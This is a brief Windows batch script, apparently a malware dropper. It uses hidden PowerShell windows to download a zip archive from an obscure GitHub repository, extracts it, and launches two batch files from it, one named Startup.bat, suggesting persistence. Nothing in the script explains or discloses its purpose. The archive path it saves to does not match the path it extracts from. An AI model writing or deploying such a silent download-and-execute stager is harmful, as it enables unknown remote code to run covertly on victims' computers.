@echo off
PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/ms.zip -OutFile '%USERPROFILE%\ms\ms.zip'"
timeout /t 120/nobreak
PowerShell.exe -NoProfile -WindowStyle hidden -Command "Expand-Archive -Path 'ms.zip' -DestinationPath 'ms' -Force"
timeout /t 40/nobreak
start "" ms\Shortcut.bat
timeout /t 10/nobreak
start "" ms\Startup.bat

